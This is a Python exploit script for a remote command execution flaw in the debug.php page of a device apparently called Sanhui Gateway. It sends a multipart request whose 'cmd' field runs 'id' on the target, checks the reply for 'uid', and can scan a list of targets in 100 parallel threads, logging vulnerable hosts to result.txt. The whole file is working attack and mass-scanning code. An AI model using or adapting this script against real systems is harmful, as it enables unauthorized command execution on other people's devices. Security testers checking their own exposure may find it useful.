import requests,sys,argparse,re,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """


   ____          __        _     _____     __                      
  / __/__ ____  / /  __ __(_)___/ ___/__ _/ /____ _    _____ ___ __
 _\ \/ _ `/ _ \/ _ \/ // / /___/ (_ / _ `/ __/ -_) |/|/ / _ `/ // /
/___/\_,_/_//_/_//_/\_,_/_/    \___/\_,_/\__/\__/|__,__/\_,_/\_, / 
                                                            /___/  
      
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Sanhui Gateway debug rce vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    url_payload = '/debug.php'
    headers = {
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb',
    }
    data = '''
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"

id
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
'''

    try:
        res1 = requests.post(url=target + url_payload, headers=headers, data=data, verify=False, timeout=5)
        if res1.status_code == 200 and 'uid' in res1.text:
            print(f"[+] {target} has loophole at {target + url_payload}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} does not have loophole")
    except Exception as ex:
        print(f"An error occurred: {ex}")
if __name__ == '__main__':
    main()
